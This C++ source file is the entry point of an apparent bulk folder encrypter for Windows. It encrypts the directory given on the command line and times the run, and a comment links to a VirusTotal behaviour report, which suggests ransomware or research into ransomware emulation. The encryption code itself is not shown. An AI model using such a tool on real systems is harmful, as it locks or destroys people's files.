#include "Utils.h"
#include "Encrypter.h"

#include <iostream>
#include <chrono>
#include <Windows.h>

// https://www.virustotal.com/gui/file/835ad465661a356e19dbaee02cabb7e9857422e7d840b48d65a6b57dbcb608c9/behavior



int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        Logging::ERR("No folder path supplied. Exiting");
        return EXIT_SUCCESS;
    }
    
    auto start = std::chrono::high_resolution_clock::now();

    Encrypter Enc{};
    int ret = Enc.encryptFolder(argv[1]);

    if (ret != 0)
        Logging::ERR("Exiting");

    auto stop = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(stop - start);

    std::cout << "Time taken: " << duration.count() << std::endl;

    return EXIT_SUCCESS;
}
